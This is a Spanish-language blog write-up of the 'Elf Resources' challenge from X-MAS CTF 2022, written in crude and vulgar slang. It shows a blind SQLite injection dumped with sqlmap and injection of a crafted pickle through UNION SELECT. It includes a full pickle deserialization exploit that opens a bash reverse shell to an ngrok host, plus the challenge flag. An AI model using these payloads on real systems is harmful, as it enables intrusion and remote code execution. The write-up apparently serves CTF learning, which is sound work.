---
layout: post
title:  "X-MAS CTF 2022 - 🧝 Elf Resources"
date:   2022-12-23 03:43:53 -0300
categories: X-MAS
---

![Elfos re locos](/ctf/assets/images/Gabies_Christmas_Elf_human_resources_of_Santa_Claus_toy_manufac_f7be4610-15af-4da7-8c2e-41653a165d29.png)

# Papa Noel rata

Parece ser que Papa Noel anduvo ratoneando con el presupuesto y contrato un par de devs medio pelo para que le levanten el sitio. Es muy probable que este mas roto que el orto de tu hermana, así que le vamos a abrir las cachas para catearlo un poco.

A primera vista tenemos una hermosa pagina donde llueve merca, esto me hace sentir como en navidad. En un ratito nos damos cuenta que la aplicación se chupa 3 ID's y muestra un mensaje diferente para cada uno.

![Gordo nieve](/ctf/assets/images/gordo-nieve.png)

Que lindo el gordo del octavo patinando.

# Blind SQLite Injection

Después de fuzzear un rato a manopla, llegue a la conclusion de que se comía un `SQL Injection`. Estos devs del 2010 que nunca mas volvieron a laburar.

`http://challs.htsp.ro:13001/1+1`

![Helping Santa](/ctf/assets/images/helping-santa.png)

Aclaro que el string `Helping Santa` corresponde al ID 2.

A darle matraca.

Como la aplicación no retornaba ningún tipo de error que revelara información sobre el DBMS, me decante por una `SQLite Injection`. Por que?.. por que es una app en `Python` y lo mas probable es que estén conectando con `SQLite`.

 La inyección es sencilla, un IF que devuelve 2 si esta todo OK, por lo tanto se va a mostrar el mensaje `Helping Santa` y si ta todo mal muestra el string `Looking at the naughty list` que corresponde al ID 3. Verdadero o Falso papu, es verdad que te garchaste a tu prima?.

 `http://challs.htsp.ro:13001/(SELECT%20IIF(1=1,2,3))`

![SQLite Injection](/ctf/assets/images/SQLite-Injection-1.png)

Ahora, después de intentar sacar un Union Based, Error Based o algo que no sea Blind, termine chupandole la pija a `SQLmap`. Estaba mas que claro que tenia que jugar al no vidente. Alta paja amigo.

Dumpeamos todo y a la verga.

`$ sqlmap -u http://challs.htsp.ro:13001/\(SELECT%20IIF\(1\=1\*,2,3\)\) --prefix="" --dbms=sqlite3 --technique=B -vv --string="Helping Santa" --dump-all`

![SQLmap](/ctf/assets/images/SQLmap.png)

# Pickle y la concha de tu madre.

Acá es donde me rebusque demasiado con algo tan simple. Claramente tenia el contenido de la tabla `elves`.

{% highlight text %}
Table: elves
[3 entries]
+----+------------------------------------------------------------------------------------------------------------------------------------------+
| id | data                                                                                                                                     |
+----+------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg==             |
| 2  | gASVSwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwEQmVsbJSMCGFjdGl2aXR5lIwNSGVscGluZyBTYW50YZSMAmlklE51Yi4=                     |
| 3  | gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4= |
+----+------------------------------------------------------------------------------------------------------------------------------------------+

{% endhighlight %}

Listo digo, en alguno de esos `base64` tiene que estar el `flag`, a decodear. La chota.

{% highlight bash %}
$ echo -n "gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4="|base64 -d | xxd

00000000: 8004 955a 0000 0000 0000 008c 085f 5f6d  ...Z.........__m
00000010: 6169 6e5f 5f94 8c03 456c 6694 9394 2981  ain__...Elf...).
00000020: 947d 9428 8c04 6e61 6d65 948c 0553 6e6f  .}.(..name...Sno
00000030: 7779 948c 0861 6374 6976 6974 7994 8c1b  wy...activity...
00000040: 4c6f 6f6b 696e 6720 6174 2074 6865 206e  Looking at the n
00000050: 6175 6768 7479 206c 6973 7494 8c02 6964  aughty list...id
00000060: 944e 7562 2e                             .Nub.

{% endhighlight %}

Que poronga es esto?.

La verdad, estuve un rato largo para darme cuenta de que eso era un objeto serializado.

Hasta que mas o menos me avive, por que pensaba que podía ser, hice la prueba de fuego.

{% highlight python %}
>>> import pickle
>>> from base64 import b64decode
>>> pickle.loads(b64decode(b'gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4='))

Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: Can't get attribute 'Elf' on <module '__main__' (built-in)>

{% endhighlight %}

Bueno acá hubo un fail y es que según `stackoverflow` tiene que estar como mínimo definida la clase `Elf`.

Gracias por tanto `stackoverflow` y perdón por tan poco.

{% highlight python %}
>>> class Elf:
...    pass
...
>>> elf = pickle.loads(b64decode(b'gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4='))
>>>
>>> dir(elf)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'activity', 'id', 'name']

>>> elf.name, elf.activity, elf.id
('Snowy', 'Looking at the naughty list', None)

{% endhighlight %}

# Muchaaachoooss esta noche quiero un Reverse Shell

Primero lo primero, podemos decirle a la app: `Deserializamela`?.

Si, por medio de la bendita `SQLite Injection`. Metemos un `UNION SELECT` y forzamos a que la app tome el primer valor con `LIMIT`, que seria nuestro objeto serializado.

Algo asi:

`1 UNION SELECT <falopa64> LIMIT 1`

Vamos a modificar unos valores en el objeto `Elf` para probar, lo serializamos y lo inyectamos como loco.

{% highlight python %}
>>> from base64 import b64encode

>>> elf.name = 'Messi'
>>> elf.activity = 'Que mira bobo'
>>> elf.id = None

>>> b64encode(pickle.dumps(elf))
b'gASVTAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFTWVzc2mUjAhhY3Rpdml0eZSMDVF1ZSBtaXJhIGJvYm+UjAJpZJROdWIu'
>>>

{% endhighlight %}

Mandaleee meeechaaaa.

{% highlight text %}
http://challs.htsp.ro:13001/1%20UNION%20SELECT%20'gASVTAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFTWVzc2mUjAhhY3Rpdml0eZSMDVF1ZSBtaXJhIGJvYm+UjAJpZJROdWIu'%20LIMIT%201
{% endhighlight %}

![que mira bobo](/ctf/assets/images/messi-que-mira-bobo.png)

Que leendoo.

Bueno vamos directo al exploit así nos tiramos un Reverse Shell que ya me da japa seguir escribiendo.

{% highlight python %}
import pickle, os
from base64 import b64encode

class QuemiraBoboooo(object): # bobo el que lee
    def __reduce__(self):
        return(os.system,("bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/18840 0>&1'",))

falopa64 = b64encode(pickle.dumps(QuemiraBoboooo()))

print(falopa64)

{% endhighlight %}

Simplemente creamos el objeto `QuemiraBoboooo` y definimos el método `__reduce__`. Según me dijo mi profesor de serializaciones este método loco tiene que retornar un `string` o en este caso una `tupla`. El primer elemento de la `tupla` tiene que ser un objeto invocable `os.system`, lo mas loco es que este objeto se va a llamar durante el `unpickling`. Lo que sigue son los argumentos del objeto, en este caso nuestro reverse shell.

`bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/18840 0>&1'`

Después dumpeamos `QuemiraBoboooo` con `pickle` y lo codificamos en `base64`.

Y a soplar la vela.

{% highlight bash %}
$ python3 exploit.py                                                                                    
b'gASVVQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDpiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLnNhLm5ncm9rLmlvLzE4ODQwIDA+JjEnlIWUUpQu'
{% endhighlight %}

{% highlight text %}
http://challs.htsp.ro:13001/1%20UNION%20SELECT%20'gASVVQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDpiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLnNhLm5ncm9rLmlvLzE4ODQwIDA+JjEnlIWUUpQu'%20LIMIT%201
{% endhighlight %}

![Pwned](/ctf/assets/images/Pwneddd.png)

`X-MAS{3Lf_HuM4n_R350urC35_w1lL_83_C0n74C71N9_Y0u_500n}`

Feli navida, no usen pickle, escabien mucho, metanle clona a la abuela.
